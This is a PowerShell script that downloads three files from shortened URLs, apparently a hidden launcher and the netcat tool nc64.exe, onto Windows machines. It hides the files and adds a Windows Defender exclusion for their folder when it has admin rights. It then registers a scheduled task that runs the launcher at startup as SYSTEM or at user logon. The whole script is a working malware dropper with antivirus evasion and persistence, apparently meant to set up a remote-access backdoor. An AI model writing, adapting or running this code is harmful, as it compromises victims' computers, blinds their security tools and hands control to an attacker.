# Check if the script is running with administrative privileges
$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Set the installation path and script.vbs URL based on privilege level
if ($isAdmin) {
    Write-Output "Running with administrative privileges"
    $installPath = "C:\Windows"
    $scriptVbsUrl = "https://rb.gy/w3a7hb"
} else {
    Write-Output "Running without administrative privileges"
    $installPath = Join-Path $env:USERPROFILE "System"
    $scriptVbsUrl = "https://rb.gy/3lld2p"
}

# Create the installation directory if it doesn’t exist
if (-not (Test-Path $installPath)) {
    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
    Write-Output "Created directory: $installPath"
}

# Define file paths
$quietExePath = Join-Path $installPath "Quiet.exe"
$nc64ExePath = Join-Path $installPath "nc64.exe"
$scriptVbsPath = Join-Path $installPath "script.vbs"

# URLs for the files
$quietExeUrl = "https://rb.gy/mx0i5"
$nc64ExeUrl = "https://rb.gy/guty9"

# Download the files
try {
    Invoke-WebRequest -Uri $quietExeUrl -OutFile $quietExePath -ErrorAction Stop
    Invoke-WebRequest -Uri $nc64ExeUrl -OutFile $nc64ExePath -ErrorAction Stop
    Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath -ErrorAction Stop
    Write-Output "Files downloaded to $installPath"
} catch {
    Write-Output "Download failed: $_"
    exit
}

# Hide the downloaded files
attrib +H $quietExePath
attrib +H $nc64ExePath
attrib +H $scriptVbsPath
Write-Output "Files hidden"

# Add Windows Defender exclusion if running with admin privileges
if ($isAdmin) {
    try {
        Add-MpPreference -ExclusionPath $installPath -ErrorAction Stop
        Write-Output "Windows Defender exclusion added for $installPath"
    } catch {
        Write-Output "Failed to add Windows Defender exclusion: $_"
    }
}

# Define the action to run script.vbs using wscript.exe with quoted path
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$scriptVbsPath`""

# Define the task settings
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Configure the scheduled task based on privilege level
if ($isAdmin) {
    # For admin: run at startup as SYSTEM with highest privileges
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $taskName = "RunScriptVBS-SYSTEM"
} else {
    # For non-admin: run at logon as current user with interactive logon
    $trigger = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
    $taskName = "RunScriptVBS-$env:USERNAME"
}

# Register the scheduled task
try {
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force -ErrorAction Stop
    Write-Output "Scheduled task '$taskName' has been created successfully."
} catch {
    Write-Output "Failed to create the scheduled task: $_"
    exit
}
